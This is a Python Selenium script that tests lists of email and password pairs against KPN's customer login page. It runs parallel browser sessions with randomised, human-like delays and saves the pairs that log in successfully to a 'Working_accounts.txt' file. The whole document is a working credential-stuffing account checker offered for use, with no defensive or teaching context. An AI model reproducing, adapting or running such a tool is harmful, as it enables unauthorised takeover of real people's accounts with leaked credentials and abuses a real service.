import time
import random
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options as c_Options
from multiprocessing import Process
from multiprocessing import freeze_support

global PATH_chrome, PATH_firefox, PATH_comodo
PATH_chrome = ".\\chromedriver.exe"
chrome_options = webdriver.ChromeOptions()

def login(email,password):
    driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)
    driver.get("https://inloggen.kpn.com/")
    time.sleep(5)
    try:
        c = driver.find_element_by_id('onetrust-accept-btn-handler')
        c.click()
    except Exception as e:
        print(e)
        pass

    time.sleep(2)
    e = driver.find_element_by_id('email')
    e.send_keys(email)
    time.sleep(random.uniform(1,2))
    e.send_keys(Keys.TAB)

    time.sleep(random.uniform(2,3))
    p = driver.find_element_by_id('password')
    p.send_keys(password)
    time.sleep(random.uniform(1,2))
    p.send_keys(Keys.RETURN)

    time.sleep(2)

    n = driver.find_elements_by_class_name("notification-text")
    if(not n):
        print("[Login Status] : Login Success")
        f = open(".\\Working_accounts.txt", "a+")
        f.write("Email : " + email + " | Password : " + password + "\n\r")
        f.close()
    else:
        print("[Login Status] : Login Failed")
        f = open(".\\Not_working_accounts.txt", "a+")
        f.write("Email : " + email + " | Password : " + password + "\n\r")
        f.close()


    time.sleep(3)
    driver.close()

def launch(n):
    data = pd.read_csv('.\\data.csv',sep=';')

    emails = data['Email'].tolist()
    passwords = data['Password'].tolist()
    processes = []

    while (len(emails) != 0):
        for i in range(int(n)):
            p = Process(target=login, args=(emails[0], passwords[0]))
            p.start()
            time.sleep(random.uniform(1, 2))
            processes.append(p)

            emails.remove(emails[0]), passwords.remove(passwords[0])

        for process in processes:
            process.join()


    print("######### Script Done #########")

if __name__ == '__main__':
    freeze_support()
    n = input('Number of threads   : ')
    launch(n)
